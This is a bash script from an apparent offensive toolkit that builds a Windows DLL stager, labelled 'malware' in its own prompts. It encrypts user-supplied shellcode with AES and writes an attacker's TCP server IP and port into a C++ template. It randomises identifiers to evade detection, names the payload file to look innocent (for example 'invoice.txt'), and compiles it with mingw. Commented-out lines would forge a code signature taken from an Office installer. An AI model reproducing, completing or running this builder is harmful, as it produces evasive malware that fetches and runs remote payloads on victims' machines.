#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
TCP DLL STAGER                        

EOF

echo -e ${green}"Enter The Path To Your Shellcode File. ex: /home/user/Downloads/shellcode.bin"${clear}
echo ""
read Shellcode
echo ""
echo -e ${green}"What's The IP For Your TCP Server?"${clear}
echo ""
read HOSTIP
echo ""
echo -e ${green}"What Is The Port Your TCP Server Is Using?"${clear}
echo ""
read PORTY
echo ""
echo -e ${green}"Name Your Shellcode File. ex: invoice.txt"${clear}
echo ""
read SHELLCODEFILE
echo ""
echo -e ${green}"Name Your Malware! ex: malware.dll"${clear}
echo ""
read MALWARE
echo ""
cp StageFright/TCPDLL/template.cpp StageFright/TCPDLL/Resources/template.cpp
echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
echo ""
sleep 2
python3 StageFright/TCPDLL/Resources/aesencrypt.py $Shellcode > shell.txt
echo -e ${yellow}"***Encryption Completed***"${clear}
echo ""
cp shell.txt shell2.txt

#Generate AES Key
keys=$(cat "shell2.txt")
cut -d 'p' -f1 shell2.txt > shell3.txt
keys=$(cat shell3.txt)
keysnow=${keys#*=}
sed -i "s/KEYVALUE/$keysnow/g" StageFright/TCPDLL/Resources/template.cpp

#Generate AES Payload
payload=$(cat "shell.txt")
payloadnow=${payload#*;}
payloadtoday=${payloadnow#*=}
echo $payloadtoday > shell5.txt
cp StageFright/TCPDLL/conv.py StageFright/TCPDLL/Resources/con.py
perl -pe 's/PAYVAL/`cat shell5.txt`/ge' -i StageFright/TCPDLL/Resources/con.py
sed -i "s/{/[/g" -i StageFright/TCPDLL/Resources/con.py
sed -i "s/}/]/g" -i StageFright/TCPDLL/Resources/con.py
sed -i "s/;//g" -i StageFright/TCPDLL/Resources/con.py
python3 StageFright/TCPDLL/Resources/con.py
#rm StageFright/TCPDLL/Resources/con.py
mv payload.bin $SHELLCODEFILE
sleep 2

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
RandomE=$(cat shell.txt)
sed -i "s/RandomE/$RandomE/g" StageFright/TCPDLL/Resources/template.cpp


#Replace IP, PORT and SHELLCODEFILE
sed -i "s/HOSTIP/$HOSTIP/g" StageFright/TCPDLL/Resources/template.cpp
sed -i "s/PORTY/$PORTY/g" StageFright/TCPDLL/Resources/template.cpp
sed -i "s/SHELLCODEFILE/$SHELLCODEFILE/g" StageFright/TCPDLL/Resources/template.cpp
#Replacing Values

# Get Payload From URL Function

#FindShare
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-12} | head -n 1 > shell.txt
Random1=$(cat shell.txt)
sed -i "s/Random1/$Random1/g" StageFright/TCPDLL/Resources/template.cpp

#pPayloadBytes
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
Random2=$(cat shell.txt)
sed -i "s/Random2/$Random2/g" StageFright/TCPDLL/Resources/template.cpp

#sPayloadSize
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
Random3=$(cat shell.txt)
sed -i "s/Random3/$Random3/g" StageFright/TCPDLL/Resources/template.cpp

#sPayloadSize
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
Random4=$(cat shell.txt)

sed -i "s/Random3/$Random3/g" StageFright/TCPDLL/Resources/template.cpp
#bSTATE
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
Random5=$(cat shell.txt)
sed -i "s/Random5/$Random5/g" StageFright/TCPDLL/Resources/template.cpp

#sSize
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-7} | head -n 1 > shell.txt
Random6=$(cat shell.txt)
sed -i "s/Random6/$Random6/g" StageFright/TCPDLL/Resources/template.cpp

#hInternet
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-12} | head -n 1 > shell.txt
Random7=$(cat shell.txt)
sed -i "s/Random7/$Random7/g" StageFright/TCPDLL/Resources/template.cpp

#dwBytesRead
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-13} | head -n 1 > shell.txt
Random8=$(cat shell.txt)
sed -i "s/Random8/$Random8/g" StageFright/TCPDLL/Resources/template.cpp

#pBytes
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
Random9=$(cat shell.txt)
sed -i "s/Random9/$Random9/g" StageFright/TCPDLL/Resources/template.cpp

#PAYLOAD
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
RandomA=$(cat shell.txt)
sed -i "s/RandomA/$RandomA/g" StageFright/TCPDLL/Resources/template.cpp

#Sleep Function

cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
RandomJ=$(cat shell.txt)
sed -i "s/RandomJ/$RandomJ/g" StageFright/TCPDLL/Resources/template.cpp

#AES KEY NAME
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-12} | head -n 1 > shell.txt
RandomK=$(cat shell.txt)
sed -i "s/RandomK/$RandomK/g" StageFright/TCPDLL/Resources/template.cpp

# Main Function

#Bytes
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
RandomB=$(cat shell.txt)
sed -i "s/RandomB/$RandomB/g" StageFright/TCPDLL/Resources/template.cpp

#Size
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
RandomC=$(cat shell.txt)
sed -i "s/RandomC/$RandomC/g" StageFright/TCPDLL/Resources/template.cpp

#Compile

echo -e ${yellow}"+++Compiling Malware+++"${clear}
x86_64-w64-mingw32-g++ -shared -o $MALWARE StageFright/TCPDLL/Resources/template.cpp -lws2_32 -lntdll -static-libgcc -static-libstdc++ -Wl,--subsystem,windows -O2 -Wno-narrowing -fpermissive >/dev/null 2>&1
echo ""
sleep 2
rm shell*
echo -e ${yellow}"***Malware Compiled***"${clear}
echo ""
sleep 2
echo -e ${yellow}"***Edit And Run The TCP Server***"${clear}
#echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
#echo ""
#sleep 2
#python3 StageFright/StageFright/ResourcesSigThief/sigthief.py -i StageFright/StageFright/TCPDLL/Resources/OfficeSetup.exe #-t $MALWARE -o signed$MALWARE >/dev/null 2>&1
#mv signed$MALWARE $MALWARE
#echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
#echo ""


